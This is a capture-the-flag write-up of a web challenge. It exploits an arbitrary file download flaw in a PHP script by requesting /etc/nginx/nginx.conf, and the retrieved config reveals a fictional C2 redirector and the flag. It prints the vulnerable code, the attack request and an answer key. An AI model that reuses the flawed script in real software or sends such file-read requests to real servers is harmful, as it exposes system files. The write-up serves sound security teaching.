# Un Chasseur sachant chasser


- Started on: 2022-11-24
- Last Modified: 2022-11-24

---
- CorentinGoet 
- corentin.goetghebeur@ensta-bretagne.org

---
Challenge Info:
- Category: Web
- Difficulty: Easy
- Score: 50 points

---

## Challenge
Des analystes SOC du _Ministère des Armées_ ont remarqué des flux suspects provenant de machines internes vers un site vitrine d'une entreprise. Pourtant ce site semble tout à fait légitime.

Vous avez été mandaté par la _Direction Générale de l'Armement_ pour mener l'enquête. Trouvez un moyen de reprendre partiellement le contrôle du site web afin de trouver comment ce serveur joue un rôle dans l'infrastructure de l'acteur malveillant.

Aucun fuzzing n'est nécessaire.

Le flag se trouve sur le serveur à l'endroit permettant d'en savoir plus sur l'infrastructure de l'attaquant.

## Write-Up

For this challenge, the PHP script used to download the menu is vulnerable. It allows to download any existing file from the server.

For example, we can download the source code of the php download script.

```php
<?php
# Got it from : https://linuxhint.com/download_file_php/
#Â Should be safe uh ?
if(isset($_GET['menu'])){
    //Read the filename
    $filename = $_GET['menu'];
    //Check the file exists or not
    if(file_exists($filename)) {

        //Define header information
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header("Cache-Control: no-cache, must-revalidate");
        header("Expires: 0");
        header('Content-Disposition: attachment; filename="'.basename($filename).'"');
        header('Content-Length: ' . filesize($filename));
        header('Pragma: public');

        //Clear system output buffer
        flush();

        //Read the size of the file
        readfile($filename, true);

        //Terminate from the script
        die();

    } else{
        echo "File does not exist.";
    }

} else {
    echo "Filename is not defined.";
}
```

The challenge says that the flag is on the file that gives information about the infrastructure of the server. Since the target uses Nginx as server, a quick Google search tells us the config file for it is :*/etc/nginx/nginx.conf*

We can try to download it using the url:

[...]/download.php?menu=/etc/nginx/nginx.conf 

```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 24 Nov 2022 16:26:03 GMT
Content-Type: application/octet-stream
Content-Length: 2688
Connection: close
Content-Description: File Transfer
Cache-Control: no-cache, must-revalidate
Expires: 0
Content-Disposition: attachment; filename="nginx.conf"
Pragma: public

worker_processes auto;
error_log stderr warn;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {

    include mime.types;
    default_type application/octet-stream;

    # Define custom log format to include reponse times
    log_format main_timed '$remote_addr - $remote_user [$time_local] "$request" '
                          '$status $body_bytes_sent "$http_referer" '
                          '"$http_user_agent" "$http_x_forwarded_for" '
                          '$request_time $upstream_response_time $pipe $upstream_cache_status';

    access_log /dev/stdout main_timed;
    error_log /dev/stderr notice;

    server_tokens off;

    keepalive_timeout 65;

    # Write temporary files to /tmp so they can be created as a non-privileged user
    client_body_temp_path /tmp/client_temp;
    proxy_temp_path /tmp/proxy_temp_path;
    fastcgi_temp_path /tmp/fastcgi_temp;
    uwsgi_temp_path /tmp/uwsgi_temp;
    scgi_temp_path /tmp/scgi_temp;

    # Default server definition

    server {

        listen 80 default_server;
        server_name _;

        sendfile off;
        tcp_nodelay on;
        absolute_redirect off;

        root /var/www/html;
        index index.html;

        location / {
            # First attempt to serve request as file, then
            # as directory, then fall back to index.php
            try_files $uri $uri/ /index.php?q=$uri&$args;
        }

        # Redirect server error pages to the static page /50x.html
        error_page 500 502 503 504 /50x.html;
        location = /50x.html {
            root /var/lib/nginx/html;
        }

        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_split_path_info ^(.+\.php)(/.+)$;
            fastcgi_pass unix:/run/php-fpm.sock;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param SCRIPT_NAME $fastcgi_script_name;
            fastcgi_index index.php;
            include fastcgi_params;
        }

        # Deny access to . files, for security
        location ~ /\. {
            log_not_found off;
            deny all;
        }

        # Website Acquisition : done.
        # This rule is to become our redirector c2.
        # Covenant 0.5 works on a Linux docker.
        # The GRUNT port must be tcp/8000-8250.
        # DGHACK{L3s_D0ux_Burg3r5_se_s0nt_f4it_pwn_:(}
        location ^~ /1d8b4cf854cd42f4868849c4ce329da72c406cc11983b4bf45acdae0805f7a72 {
            limit_except GET POST PUT { deny all; }
            rewrite /1d8b4cf854cd42f4868849c4ce329da72c406cc11983b4bf45acdae0805f7a72/(.*) /$1  break;
            proxy_pass https://covenant-attacker.com:7443;
        }
    }
}
```

And we find the flag in this file.

